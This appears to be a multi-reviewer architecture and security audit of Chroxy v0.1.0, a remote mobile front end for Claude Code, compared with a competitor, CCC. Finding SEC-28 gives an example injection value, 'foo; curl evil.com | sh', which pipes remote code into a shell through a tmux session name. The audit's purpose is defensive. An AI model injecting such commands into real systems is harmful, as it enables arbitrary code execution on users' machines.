# Architect Review: Chroxy v0.1.0 vs CCC v2.0

**Date:** 2026-02-08
**Reviewers:** 3 independent senior architect agents (Security/Protocol, Server/App Architecture, DX/Product Strategy)
**Scope:** Deep code review + competitive analysis against CCC (@naarang/ccc v2.0)

---

## Competitor Profile: CCC (Code Chat Connect)

| Attribute | CCC v2.0 | Chroxy v0.1.0 |
|-----------|----------|---------------|
| **License** | UNLICENSED (closed-source) | MIT (open-source) |
| **Runtime** | Bun | Node.js |
| **Transport** | MQTT broker (ports 8883/8884/3001) | WebSocket over cloudflared |
| **Auth** | ngrok HTTP basic auth + MQTT credentials (2 layers) | Single API token over WebSocket (1 layer) |
| **Install** | `curl \| bash` standalone binary | 3 prerequisites (Node 22, tmux, cloudflared) |
| **App stores** | Both App Store and Google Play | Neither |
| **Parallel agents** | Yes (multiple Claude sessions) | No (single session) |
| **File browser** | Full: syntax highlighting, editing, upload/download | None |
| **Checkpoints** | Rewind/restore from mobile | Env var enabled but unexposed |
| **Terminal** | Native with smooth scroll, session resume | Plain text dump (`<Text>` component) |
| **Discovery** | mDNS/Bonjour (auto-find on LAN) | Manual QR scan or URL entry |
| **Git integration** | Yes | No |
| **Push notifications** | Yes | No |
| **Model switching** | Yes (presumably context-preserving) | Yes (destroys conversation context) |

---

## Part 1: Security & Protocol Findings

*Reviewer: Senior Security Architect*

### SEC-27: Config File Written World-Readable — Token Exposed to Local Users
**Priority:** High
**Labels:** `security`, `secret-management`

In `packages/server/src/cli.js:84`, the config file is written with `writeFileSync` and no `mode` option. Node.js defaults to `0o666` minus umask, typically yielding `0o644` — any local user can read `~/.chroxy/config.json` and extract the API token.

**Scope:**
- Write config with `mode: 0o600` (owner read/write only)
- On startup, check existing config permissions and warn if too open (like SSH does)
- Consider OS keychain integration (app side already uses `expo-secure-store`)

**Competitive Context:** CCC uses ngrok HTTP basic auth as a second layer, so even a leaked local token doesn't grant access alone. Chroxy's token is the only barrier.

---

### SEC-28: Shell Command Injection via tmux Session Name (Confirmed)
**Priority:** High
**Labels:** `security`, `injection`

The session name from user config is interpolated directly into `execSync` shell strings in `pty-manager.js:33,108`. A session name like `foo; curl evil.com | sh` would execute arbitrary commands. Config files can be shared or version-controlled, and `TMUX_SESSION` env var is also accepted.

**Scope:**
- Validate session names: `/^[a-zA-Z0-9_-]+$/`
- Use `execFileSync('tmux', ['has-session', '-t', name])` instead of `execSync` with string interpolation
- Apply to all tmux command constructions

**Competitive Context:** CCC does not use tmux — runs headless Bun processes directly, avoiding this vulnerability class entirely.

---

### SEC-29: No Rate Limiting on Authentication — Connection Flood DoS
**Priority:** Medium
**Labels:** `security`, `dos`

Each WebSocket connection attempt allocates a UUID client ID, Map entry, 10-second timer, and event listeners. No tracking of failed attempts by source IP. The UUID token has 122 bits of entropy (brute-force infeasible), but the server can be trivially DoS'd by connection flooding.

**Scope:**
- Max 5 unauthenticated connections at once (global limit)
- Track failed auth per source IP with exponential backoff
- Consider connection-level challenge-response before accepting auth message

**Competitive Context:** CCC layers ngrok HTTP basic auth before MQTT, so unauthenticated traffic never reaches the application server.

---

### SEC-30: `--allowed-tools` Bypasses All Permission Prompts Over Remote
**Priority:** High
**Labels:** `security`, `privilege-escalation`

In `cli-session.js:79`, `--allowedTools` is passed to `claude -p`, auto-approving tools without user confirmation. When combined with remote phone access, a user who starts with `--allowed-tools "Bash,Write,Edit"` allows anyone with the token to execute arbitrary commands with zero approval gates.

**Scope:**
- Display prominent warning at startup when `--allowed-tools` is set
- Forward tool approval prompts to mobile client as interactive messages
- Consider naming it `--dangerous-auto-approve` to make risk explicit
- Document that `--allowed-tools` should never include `Bash` for remote scenarios

**Competitive Context:** CCC routes tool approvals through client UI with inline permissions. Chroxy's flag silently removes this safety layer.

---

### SEC-31: No Session Expiry or Token Rotation
**Priority:** Medium
**Labels:** `security`, `session-management`

After auth in `ws-server.js:150`, the `authenticated` flag is permanent. `client.authTime` is recorded but never checked against expiry. A compromised phone stays authenticated indefinitely. The static UUID token never changes unless user re-runs `chroxy init`.

**Scope:**
- Add configurable session TTL (e.g., 24 hours) with `auth_fail` + `session_expired` on expiry
- Add `chroxy rotate-token` command
- Consider short-lived JWT session tokens after initial auth

**Competitive Context:** CCC's ngrok credentials can be changed independently of application credentials. Chroxy has a single static secret.

---

### SEC-32: Full Process Environment Inherited by Claude Child Process
**Priority:** Medium
**Labels:** `security`, `secret-leakage`

In `cli-session.js:96-101`, `...process.env` is spread into the child environment. Every env var (AWS keys, GitHub tokens, database URLs) is accessible to Claude. Since Claude can run `env` via the Bash tool, an LLM-driven exfiltration vector exists.

**Scope:**
- Construct explicit allowlist of env vars: PATH, HOME, SHELL, TERM, LANG, and Claude-specific vars
- Never include `API_TOKEN` in child environment
- Document which variables are forwarded

**Competitive Context:** Risk shared by all Claude Code wrappers, but CCC uses explicit Bun environment configuration rather than inheriting everything.

---

### SEC-33: Auto-Trust Regex Is Overly Broad
**Priority:** Medium
**Labels:** `security`, `defense-in-depth`

In `server.js:39-57`, the pattern `/Yes.*trust/i` matches any line containing both words in that order, potentially auto-confirming unintended prompts. On `--resume`, the trust dialog for a different directory is silently accepted.

**Scope:**
- Tighten regex to match exact Claude Code trust prompt format
- Add `--no-auto-trust` flag
- Log the full matched line for audit
- Skip auto-trust on `--resume`

**Competitive Context:** CCC runs exclusively in headless mode and never interacts with PTY-based trust dialogs.

---

### SEC-34: QR Code Connection URL Has No Expiry
**Priority:** Medium
**Labels:** `security`, `token-exposure`

In `server.js:87` and `server-cli.js:66`, the full API token is embedded in `chroxy://` URL rendered as QR. Screenshots, shoulder-surfing, terminal scrollback, or log capture exposes permanent credentials.

**Scope:**
- Generate short-lived connection token (60 seconds) for QR display, exchanged for session token on first use
- Clear terminal after QR display or offer `--clear-qr`
- Never log full connection URL to files

**Competitive Context:** CCC uses mDNS for local discovery (no token in URL) and separate ngrok credentials.

---

### PROTO-13: Cloudflare Quick Tunnel Provides Zero Tunnel-Layer Authentication
**Priority:** High
**Labels:** `protocol`, `architecture`

Quick Tunnels (`cloudflared tunnel --url`) provide TLS but zero access control. URL format uses dictionary words, making enumeration more feasible than random hex. The entire security model rests on a single factor.

| Layer | Chroxy (Cloudflare) | CCC (ngrok) |
|-------|-------------------|-------------|
| Tunnel auth | None | HTTP Basic Auth |
| App auth | API token over WS | MQTT credentials |
| TLS | Cloudflare edge | ngrok edge |

**Scope:**
- Investigate Cloudflare Access policies (free tier supports one application)
- Support ngrok as alternate tunnel with HTTP auth
- Consider TOTP or one-time challenge on first connection
- Document single-factor auth model clearly

**Competitive Context:** CCC has genuine defense-in-depth (tunnel credentials + application credentials). Chroxy has defense-in-breadth (one layer).

---

### PROTO-14: No WebSocket Message Size Limit — 100MB Default
**Priority:** Medium
**Labels:** `protocol`, `dos`

`WebSocketServer` created with `{ noServer: true }` and no `maxPayload` in `ws-server.js:81`. The `ws` library defaults to 100MB. `JSON.parse` on a 100MB payload in-memory, or writing 100MB to a PTY, would cause severe issues.

**Scope:**
- Set `maxPayload: 1048576` (1MB)
- Add length validation on `msg.data` in input handler (10KB for PTY, 100KB for CLI)
- Add `perMessageDeflate: false` to prevent decompression bombs

**Competitive Context:** MQTT brokers enforce per-message size limits at the broker level by default.

---

### PROTO-15: No Message Integrity or Replay Protection
**Priority:** Low
**Labels:** `protocol`, `integrity`

No per-message HMAC, sequence numbers, or nonces after authentication. Network-level replay of an `input` message would be accepted and executed again. Theoretical concern for a personal dev tool, but worth noting.

**Scope:**
- Add monotonic sequence numbers rejecting out-of-order/duplicate messages
- For high-threat environments, optional HMAC on payloads derived from auth token
- Document trust assumptions (Chroxy trusts tunnel provider's TLS)

**Competitive Context:** MQTT has QoS levels with message IDs providing basic replay protection. WebSocket has no equivalent built-in.

---

## Part 2: Server & App Architecture Findings

*Reviewer: Senior Software Architect*

### SRV-19: Single-Session Architecture Cannot Support Parallel Agents
**Priority:** Critical
**Labels:** `architecture`, `multi-session`, `parity-blocker`

Both `server.js` and `server-cli.js` instantiate exactly one `CliSession` or one `PtyManager`. `WsServer` broadcasts all events to every client over that single session. No session routing, no session ID in messages, no multiplexing. The current architecture has no path to parallel agents without fundamental redesign.

**Scope:**
- Introduce `SessionManager` owning `Map<sessionId, CliSession>` with lifecycle management
- Add `session_id` field to all client messages for routing
- New protocol messages: `create_session`, `list_sessions`, `switch_session`, `destroy_session`
- Update `WsServer` to track per-client session subscriptions
- `CliSession` already has clean EventEmitter boundaries — ready for multi-instance

**Competitive Context:** CCC's v2.0 headline feature is parallel agents. Chroxy is locked to one agent per server.

---

### SRV-20: Model Switching Destroys Conversation Context
**Priority:** High
**Labels:** `cli-session`, `bug`, `data-loss`

`CliSession.setModel()` (line 403) kills the entire `claude` process and respawns with new `--model` flag. Obliterates all conversation history. `_sessionId` is explicitly nulled. User switching Sonnet to Opus mid-conversation loses everything with no warning.

**Scope:**
- Investigate if `claude -p` supports runtime model-switch via stdin NDJSON
- If not, implement conversation replay: serialize history before kill, replay into new process
- At minimum, emit `context_cleared` event so app can warn before confirming
- Add confirmation step in model selector UI

**Competitive Context:** CCC has model switching with checkpoint architecture. Chroxy silently destroys context.

---

### SRV-21: Checkpoint Infrastructure Exists But Is Completely Unexposed
**Priority:** High
**Labels:** `checkpoints`, `feature-gap`

`CliSession` already sets `CLAUDE_CODE_ENABLE_SDK_FILE_CHECKPOINTING: '1'` in process environment (line 100). Zero protocol support: no messages for listing/restoring checkpoints. Infrastructure cost is paid but value never delivered.

**Scope:**
- Server-side checkpoint discovery: scan checkpoint directory, expose via `list_checkpoints` request/response
- Add `restore_checkpoint { checkpointId }` message
- Forward checkpoint-created events as `checkpoint_created` messages to app
- Add timeline/history UI component showing checkpoint markers

**Competitive Context:** CCC has checkpoints and rewind as a core feature. Chroxy has the foundation enabled but wasted. This is the lowest-effort, highest-impact CCC parity item.

---

### SRV-23: No File Operations Protocol
**Priority:** High
**Labels:** `file-browser`, `protocol`, `feature-gap`

WebSocket protocol has exactly six client-to-server message types. None support filesystem operations. `CliSession` runs in a specific `cwd`, so the server has project filesystem access.

**Scope:**
- New message types: `fs_list`, `fs_read`, `fs_write`, `fs_stat`, `fs_upload`, `fs_download`
- `FileManager` class sandboxing operations to project `cwd` (prevent directory traversal)
- Path validation and file size limits (cap reads at ~1MB, paginate large directories)
- MIME type detection for syntax highlighting hints
- New `FileBrowserScreen` in app with tree view, syntax-highlighted viewer, editor

**Competitive Context:** CCC has full file browser with syntax highlighting, inline editing, and upload/download. Most visible non-chat feature gap.

---

### SRV-24: Duplicate Stream Delta Batching Creates 150ms Compounding Latency
**Priority:** Medium
**Labels:** `performance`, `streaming`

Deltas batched twice: server-side 50ms flush (`ws-server.js:276`) and client-side 100ms flush (`connection.ts:334`). Worst case: 150ms artificial latency on top of network RTT.

**Scope:**
- Remove server-side batching (WebSocket/TCP provide natural frame coalescing)
- Reduce client-side to 50ms or use `requestAnimationFrame`

**Competitive Context:** Chroxy should not add artificial delay on top of its WebSocket+tunnel chain.

---

### SRV-25: No Server-Side Message Persistence or History
**Priority:** High
**Labels:** `persistence`, `reconnection`

Server is stateless regarding conversation content. Client disconnect = empty chat on reconnect. The "check your phone and see what Claude did" workflow is broken.

**Scope:**
- Server-side message ring buffer (last 500 messages)
- On `auth_ok`, send `{ type: "history", messages }` for client hydration
- For persistence across restarts, write to `~/.chroxy/sessions/` keyed by session ID
- Expose `get_history { since: timestamp }` for partial catch-up

**Competitive Context:** CCC has session resume. Chroxy loses everything on disconnection.

---

### SRV-26: No Local Network Discovery (mDNS/Bonjour)
**Priority:** Medium
**Labels:** `discovery`, `connectivity`

No automatic discovery on LAN. Server logs tunnel URL and token to console. For same-network users, this is unnecessary friction. Tunnel adds latency that direct LAN connections would avoid.

**Scope:**
- Advertise `_chroxy._tcp` via `bonjour-service` npm package
- App auto-discovers via `react-native-zeroconf`
- Direct LAN WebSocket (bypass tunnel on same network)
- Enables multi-server management

**Competitive Context:** CCC uses mDNS. Table-stakes for local-network use.

---

### APP-16: Terminal View Is Plain Text — No Real Terminal Emulation
**Priority:** High
**Labels:** `terminal`, `rendering`, `feature-gap`

`TerminalView` renders entire terminal buffer as single `<Text>` component with green monospace text (line 547). ANSI stripped before display. No cursor positioning, no colors, no scrollback, no terminal emulation. This is a text dump, not a terminal.

**Scope:**
- Integrate xterm.js via WebView bridge (`react-native-webview` already in dependencies)
- Pipe raw PTY data (already available as `raw` messages) directly to `terminal.write()`
- Relay input events back as `{ type: "input", data }` messages
- Report xterm.js dimensions for PTY resize

**Competitive Context:** CCC has native terminal with smooth scroll and session resume. Chroxy's "terminal" is its most visually embarrassing weakness in side-by-side comparison.

---

### APP-17: No Markdown Rendering in Chat Bubbles
**Priority:** High
**Labels:** `chat`, `rendering`

`MessageBubble` renders all content as plain `<Text>` (line 490-491). Claude's markdown (headers, code blocks, lists, bold/italic) is unformatted. Code blocks displayed same as prose.

**Scope:**
- Integrate `react-native-markdown-display` for response bubbles
- Add syntax highlighting for code blocks (`react-native-syntax-highlighter`)
- Apply selectively: only `response` type, not `user_input` or `tool_use`
- For `tool_use` bubbles, apply language-specific highlighting based on tool name

**Competitive Context:** CCC has syntax highlighting in file browser and presumably chat. Chroxy renders everything as monochrome text.

---

### APP-18: Unbounded Message Array With No Virtualization
**Priority:** Medium
**Labels:** `performance`, `memory`

`messages` array grows without limit (line 79). `ChatView` renders all via `messages.map()` inside `ScrollView` (line 375). No `FlatList`, no virtualization. Long sessions degrade.

**Scope:**
- Replace with `FlatList` or `FlashList` (Shopify)
- Message cap (1000) with eviction
- Lazy load older messages on scroll-up if server persistence (SRV-25) is implemented

**Competitive Context:** CCC's checkpoint feature implies extended sessions. Chroxy degrades during exactly the sessions that matter.

---

### APP-19: Deep Link `chroxy://` URL Scheme Not Registered
**Priority:** Medium
**Labels:** `connectivity`, `ux`

Server generates `chroxy://` URLs, `ConnectScreen` has `parseChroxyUrl`, but no `scheme` in Expo config, no `Linking` setup in `App.tsx`. The URL scheme is decorative.

**Scope:**
- Add `scheme: "chroxy"` to Expo config
- Register `Linking` listener in `App.tsx`
- Enables tap-to-connect from notifications, web pages, clipboard

**Competitive Context:** CCC on both app stores with presumably proper deep link handling.

---

### APP-20: No Cost Tracking or Session Analytics
**Priority:** Low
**Labels:** `analytics`, `ux`

`result` messages include `cost`, `duration`, `usage` (token counts). Server logs cost to console. Client stores `contextUsage` but not cumulative cost. No spending visibility.

**Scope:**
- Add `sessionCost` to Zustand store, updated on each `result`
- Display in status bar alongside token counter
- Collapsible session stats panel: total cost, messages, tokens, duration, cache rate

**Competitive Context:** CCC likely surfaces this given model switching implies cost-aware users.

---

### APP-21: No Plugin Architecture — Open-Source Advantage Unexploited
**Priority:** Medium
**Labels:** `architecture`, `open-source`, `strategy`

Nothing in the architecture exploits being open-source. No plugin system, no extension points, no theming, no community hooks. `WsServer` message handler is a monolithic switch statement.

**Scope:**
- Server-side plugin interface: `{ name, messageTypes[], onMessage, onEvent }`
- App-side custom renderer registry for plugin message bubbles
- Middleware chain in `WsServer._handleMessage`
- Reference plugin: `chroxy-plugin-git` implementing git operations (matches CCC's git integration)
- Document plugin API to attract contributors

**Competitive Context:** CCC cannot replicate community-driven extensibility. This is the asymmetric advantage — the same dynamic that makes VS Code dominant over proprietary editors.

---

## Part 3: Product Strategy & DX Findings

*Reviewer: Senior Product Strategist*

### STRAT-01: Position as "Privacy-First Open Alternative" — Not "Open-Source CCC Clone"
**Priority:** Critical
**Labels:** `strategy`, `positioning`

Chroxy must not position itself as "the open-source CCC." That framing concedes CCC is the real product. Instead, lean into structural advantages CCC can never match: MIT license (auditable security), Cloudflare tunnel (zero-account, no MQTT broker dependency), CLI headless mode via `claude -p --output-format stream-json` (cleaner integration than PTY scraping).

**Scope:**
- Rewrite README hero section: lead with privacy/transparency, not feature comparison
- Respectful "Why not CCC?" section: open source, no intermediary, auditable auth, MIT license
- Register domain (chroxy.dev), single-page site with value prop + install + demo GIF
- Narrative: CCC is polished walled garden; Chroxy is hackable, transparent, community-owned alternative

**Competitive Context:** CCC's MQTT routes through their infrastructure. Chroxy's direct Cloudflare tunnel means zero third-party data transit. Genuine architectural advantage for security-conscious developers.

---

### STRAT-02: Define Minimum Credible v0.2 Feature Set
**Priority:** Critical
**Labels:** `strategy`, `roadmap`

v0.1.0 is a working prototype but not a product someone would recommend over CCC. v0.2 must close the credibility gap on the core use case without matching CCC's breadth.

**Minimum credible v0.2:**
1. xterm.js terminal view (current plain-text is not usable for real work)
2. TestFlight/Play Store beta builds (nobody will clone and build from source)
3. Basic test suite proving server doesn't break on updates
4. One-command server install
5. Scrollback buffer on reconnect ("see what Claude did while away")

**Competitive Context:** CCC has polished apps on both stores, native terminal, and `curl | bash` install. Without at least TestFlight access and a usable terminal, Chroxy cannot attract early adopters.

---

### STRAT-03: Release Roadmap — v0.2, v0.5, v1.0
**Priority:** High
**Labels:** `strategy`, `roadmap`

**v0.2 (4-6 weeks):** xterm.js, TestFlight, test suite, one-command install, scrollback on reconnect

**v0.5 (3-4 months):** mDNS local discovery, push notifications, Tailscale tunnel option, markdown rendering in chat, basic file viewer (read-only)

**v1.0 (6-8 months):** Multi-session support, session recording/replay, plugin architecture, App Store release, comprehensive docs site

**Scope:**
- Create `ROADMAP.md` linked from README
- Use GitHub milestones for v0.2 / v0.5 / v1.0
- Prioritize v0.2 ruthlessly — every unlisted feature is a distraction

**Competitive Context:** CCC is at v2.0. Feature-for-feature matching is a losing strategy. Ship tight core fast (v0.2), then build depth where open source has structural advantages.

---

### STRAT-04: Community Building Strategy
**Priority:** High
**Labels:** `strategy`, `community`

Chroxy needs contributors to compete with CCC's development team. Current CONTRIBUTING.md references ngrok (codebase uses Cloudflare), lists QR scanning as TODO (already implemented). Stale docs frustrate contributors.

**Scope:**
- Rewrite CONTRIBUTING.md with accurate setup instructions
- Add ARCHITECTURE.md with data flow and file references
- Create 10-15 `good first issue` GitHub issues with clear scope and acceptance criteria
- Set up GitHub Discussions for Q&A
- Publish "Building Chroxy" blog post/thread explaining architecture
- Remove stale references

**Competitive Context:** CCC is closed-source — cannot have community contributors. Healthy contributor community lets Chroxy iterate faster than a small closed-source team.

---

### TEST-08: Minimum Viable Test Suite
**Priority:** Critical
**Labels:** `testing`, `reliability`

Zero tests across 11 server files and 4 app files. OutputParser (392 LOC of regex state machine) is the single most fragile component. CliSession manages process lifecycle with complex state transitions. Both break silently on Claude Code format changes.

**Scope:**
- Add `vitest` (fast, ESM-native, zero config for this setup)
- OutputParser tests: feed captured terminal samples, assert emitted types/content
- CliSession tests: mock child process, test NDJSON handling, state transitions
- WsServer tests: auth flow (valid/invalid/timeout), message routing
- Target: 40-50 tests on critical paths, not 100% coverage

**Competitive Context:** CCC ships to app stores where broken releases mean 1-star reviews. Chroxy's open-source model means PRs touching the parser — without tests, every merge is a gamble.

---

### TEST-09: GitHub Actions CI/CD Pipeline
**Priority:** High
**Labels:** `ci-cd`, `ops`

No workflows exist. Every push to main is unchecked.

**Scope:**
- `.github/workflows/ci.yml`: npm install, npm test, lint on push/PR
- `.github/workflows/app-build.yml`: manual trigger — EAS Build for iOS/Android
- Add `eslint` with minimal config
- Add `typecheck` script for app workspace (`tsc --noEmit`)

**Competitive Context:** CCC ships through app stores with presumably rigorous QA. Chroxy needs automated smoke tests to prevent embarrassing regressions.

---

### OPS-08: Server Installation DX Overhaul
**Priority:** Critical
**Labels:** `dx`, `installation`

Current install requires: Node 22 specifically, tmux, cloudflared. README instructs `PATH="/opt/homebrew/opt/node@22/bin:$PATH"` prefix on every command. `engines` says `>=18` while CLAUDE.md says Node 22 required. CLI headless mode doesn't need node-pty or tmux but this isn't communicated.

**Scope:**
- Separate node-pty into optional dependency (CLI mode doesn't need it)
- Update `engines` to reflect actual requirements per mode
- Create `npx create-chroxy` or install script
- Add `--local` flag as first-class CLI option
- Replace `scripts/setup-repo.sh` with real installer

**Competitive Context:** CCC installs with `curl | bash`. Chroxy's 3-prerequisite PATH-hacking install is the single biggest barrier to adoption.

---

### OPS-09: App Distribution — TestFlight and Play Store
**Priority:** High
**Labels:** `distribution`, `app`

README links to `[TestFlight](#)` and `[Play Store](#)` — both dead anchors. Nobody outside the developer has installed the app except by building from source.

**Scope:**
- Configure `eas.json` with development/preview/production profiles
- TestFlight via EAS Submit for iOS
- Play Store internal testing track or APK download link
- Update README with actual links
- Consider Expo Updates for OTA patching

**Competitive Context:** CCC is on both stores. Bare minimum: TestFlight + APK download. Full Play Store can wait for v0.5.

---

### OPS-10: Hardcoded macOS Paths Make Server Linux-Incompatible
**Priority:** High
**Labels:** `portability`, `bug`

PtyManager hardcodes `/opt/homebrew/bin/tmux` (lines 33, 41, 42). Only works on Apple Silicon Macs with Homebrew. Intel Macs, Linux, WSL all break. CLI headless mode has no such restriction but this isn't documented.

**Scope:**
- Replace with `which tmux` lookup or bare `tmux` on PATH
- Startup check with helpful error if tmux not found
- Document platform support: CLI mode = macOS/Linux/WSL; terminal mode = macOS/Linux (requires tmux)

**Competitive Context:** CCC ships standalone binary that works cross-platform. Chroxy's macOS-only limitation unnecessarily shrinks user base.

---

### FEAT-11: Local Network Discovery via mDNS/Bonjour
**Priority:** Medium
**Labels:** `feature`, `networking`

Current local workflow requires manually finding IP and typing it. Fragile (DHCP), bad DX. mDNS eliminates manual IP entry for same-network use.

**Scope:**
- Server: advertise `_chroxy._tcp` via `bonjour-service`
- App: discover via `react-native-zeroconf` on ConnectScreen
- Direct LAN WebSocket (bypass tunnel) with auto-fallback for remote
- Token hash in mDNS TXT record for instance disambiguation

**Competitive Context:** CCC has mDNS. Table-stakes for local use.

---

### FEAT-12: Push Notifications for Long-Running Tasks
**Priority:** Medium
**Labels:** `feature`, `notifications`

Claude tasks run for minutes. Users pocket phone. No way to know when task completes. WebSocket may be suspended when app backgrounded on iOS.

**Scope:**
- Add `expo-notifications`
- Server sends `task_complete` on Claude response finish
- App registers push token on auth, server pushes when app not in foreground
- Start simple: "Claude finished" + first line of response

**Competitive Context:** CCC has notifications. For "launch from phone, get notified when done" — core feature, not nice-to-have.

---

### FEAT-13: xterm.js Terminal View via WebView
**Priority:** High
**Labels:** `feature`, `terminal`

Current terminal is a `<ScrollView>` + `<Text>` with ANSI-stripped green text. Cannot render colors, cursor positioning, or TUI elements. `react-native-webview` (v13.15.0) already installed but unused.

**Scope:**
- WebView-based terminal loading xterm.js
- Pipe raw PTY data (already available as `raw` messages) to `terminal.write()`
- Capture keyboard events, send as `{ type: "input" }`
- Report dimensions for PTY resize

**Competitive Context:** CCC has native terminal. Chroxy's plain-text view is most visually embarrassing weakness.

---

### FEAT-14: Markdown Rendering in Chat
**Priority:** Medium
**Labels:** `feature`, `chat-ui`

Claude's markdown (code blocks, headers, lists) rendered as plain text. Code blocks indistinguishable from prose. Degrades readability of the chat UI — the primary value prop of Chroxy's dual-view design.

**Scope:**
- Add `react-native-markdown-display`
- Apply to `response` type messages in `MessageBubble`
- Syntax highlighting for code blocks (minimum: monospace background)
- Handle streaming partial markdown edge cases

**Competitive Context:** CCC has syntax highlighting. Without markdown, Chroxy's chat is a worse version of raw terminal output.

---

### FEAT-15: Session History and Scrollback on Reconnect
**Priority:** High
**Labels:** `feature`, `persistence`

When user disconnects and reconnects, chat starts empty. The "check phone, see what Claude did while away" workflow — the core value prop of mobile remote terminal — is broken.

**Scope:**
- Server: ring buffer of last 100-200 parsed messages
- On `auth_ok`, send `{ type: "history", messages }` payload
- CLI mode: persist message array across reconnections
- App: prepend historical messages (mark as historical to avoid re-notification)

**Competitive Context:** CCC has checkpoints and rewind. Chroxy doesn't need that for v0.2, but "see what happened while disconnected" is essential.

---

## Combined Priority Matrix

### Critical (v0.2 Blockers)
| Issue | Title | Effort |
|-------|-------|--------|
| STRAT-01 | Privacy-first positioning | Low |
| STRAT-02 | v0.2 MVP definition | Planning |
| SRV-19 | Multi-session architecture (design) | XL |
| TEST-08 | Minimum viable test suite | Medium |
| OPS-08 | Server install DX overhaul | Medium |

### High (v0.2 Scope)
| Issue | Title | Effort |
|-------|-------|--------|
| SEC-27 | Config file permissions (0o600) | Tiny |
| SEC-28 | Command injection fix (execFileSync) | Small |
| SEC-30 | `--allowed-tools` warning/gating | Small |
| PROTO-13 | Tunnel auth strategy decision | Medium |
| SRV-20 | Model switch context preservation | Medium |
| SRV-21 | Expose checkpoint infrastructure | Low |
| SRV-25 | Message persistence / history | Medium |
| APP-16 | xterm.js terminal view | Medium |
| APP-17 | Markdown rendering in chat | Medium |
| FEAT-13 | xterm.js implementation | Medium |
| FEAT-15 | Scrollback on reconnect | Medium |
| OPS-09 | TestFlight / Play Store distribution | Medium |
| OPS-10 | Remove hardcoded macOS paths | Low |
| TEST-09 | GitHub Actions CI/CD | Low |
| STRAT-03 | Release roadmap | Low |
| STRAT-04 | Community building | Medium |

### Medium (v0.5 Scope)
| Issue | Title | Effort |
|-------|-------|--------|
| SEC-29 | Auth rate limiting | Small |
| SEC-31 | Session expiry / token rotation | Medium |
| SEC-32 | Environment variable allowlist | Small |
| SEC-33 | Tighten auto-trust regex | Small |
| SEC-34 | Time-limited QR codes | Medium |
| PROTO-14 | WebSocket message size limit | Tiny |
| SRV-23 | File operations protocol | XL |
| SRV-24 | Fix duplicate delta batching | Small |
| SRV-26 | mDNS local discovery | Medium |
| APP-18 | Message list virtualization | Small |
| APP-19 | Deep link registration | Small |
| APP-21 | Plugin architecture | Large |
| FEAT-11 | mDNS/Bonjour discovery | Medium |
| FEAT-12 | Push notifications | Medium |
| FEAT-14 | Markdown rendering | Low |

### Low (v1.0+ Scope)
| Issue | Title | Effort |
|-------|-------|--------|
| PROTO-15 | Message integrity / replay protection | Medium |
| APP-20 | Cost tracking dashboard | Small |

---

## Fastest Path to CCC Parity (by effort-to-impact ratio)

1. **SRV-21** — Expose checkpoints (Low effort, High impact: foundation already exists)
2. **SEC-27** — Fix config permissions (Tiny effort, eliminates trivial attack)
3. **SEC-28** — Fix command injection (Small effort, eliminates critical vuln)
4. **APP-17/FEAT-14** — Markdown rendering (Medium effort, transforms chat UX)
5. **SRV-25/FEAT-15** — Message persistence (Medium effort, enables "check later" workflow)
6. **APP-16/FEAT-13** — xterm.js terminal (Medium effort, replaces embarrassing plain text)
7. **SRV-20** — Model switch fix (Medium effort, stops silent data loss)
8. **OPS-08** — Install DX (Medium effort, removes #1 adoption barrier)

---

## Strategic Advantage Summary

**Where CCC wins:** Feature breadth, polish, app store presence, install simplicity, MQTT reliability features, defense-in-depth auth.

**Where Chroxy wins (or can win):**
- **Transparency:** MIT license, auditable code, no intermediary servers
- **Privacy:** Direct tunnel (Cloudflare/Tailscale), no MQTT broker routing
- **Extensibility:** Plugin architecture potential, community contributions
- **Simplicity:** WebSocket (universal) vs MQTT (niche), Node.js (ubiquitous) vs Bun (emerging)
- **Hackability:** Fork it, customize it, self-host it, extend it

**The play:** Don't out-feature CCC. Out-trust it. The developer who cares about what runs on their machine, who their tools phone home to, and whether they can audit the code — that's Chroxy's user.

---

*Generated from 3 independent architect reviews on 2026-02-08*
